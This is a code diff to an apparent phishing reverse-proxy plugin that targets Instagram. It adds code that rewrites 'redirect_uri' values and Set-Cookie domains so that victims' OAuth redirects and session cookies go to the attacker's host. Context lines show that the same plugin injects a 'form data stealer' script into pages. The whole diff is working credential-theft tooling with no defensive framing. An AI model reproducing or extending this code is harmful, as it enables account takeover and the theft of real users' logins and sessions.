@@ -4,6 +4,7 @@
 # Rewrites cookie domain
 
 import io
+import json
 import pathlib
 import re
 from dataclasses import dataclass
@@ -143,7 +144,17 @@ def modify_response(response: HttpResponse) -> HttpResponse:
                     b"</title>", b"</title>" + injected
                 )
                 log += "[plugins/www.instagram.com:modify_response] Form data stealer script injected\n"
-
+            if b"redirect_uri" in _decoded_body:
+                data = _decoded_body
+                match = re.search(
+                    r'"redirect_uri":"([^"]+)"', data.decode(errors="ignore")
+                )
+                if match:
+                    url = match.group(1).encode().replace(b'"', b"")
+                    modified_url = url.replace(
+                        b"https://www.instagram.com", b"http://" + actual_host
+                    )
+                    _decoded_body = _decoded_body.replace(url, modified_url)
             response.body = cctx.compress(_decoded_body)
 
     if log != "":
@@ -160,7 +171,7 @@ def modify_response(response: HttpResponse) -> HttpResponse:
             value = value.replace(b"https:", b"http:")
             new_headers.append((key, value))
         elif key.lower() == b"set-cookie":
-            new_headers.append((key, value.replace(b"instagram.com", actual_host)))
+            new_headers.append((key, value.replace(b".instagram.com", actual_host)))
         elif (
             key.lower() == b"access-control-allow-origin"
             or key.lower() == b"allow-origin"
@@ -172,5 +183,4 @@ def modify_response(response: HttpResponse) -> HttpResponse:
             new_headers.append((key, value))
 
     response.headers = new_headers
-
     return response
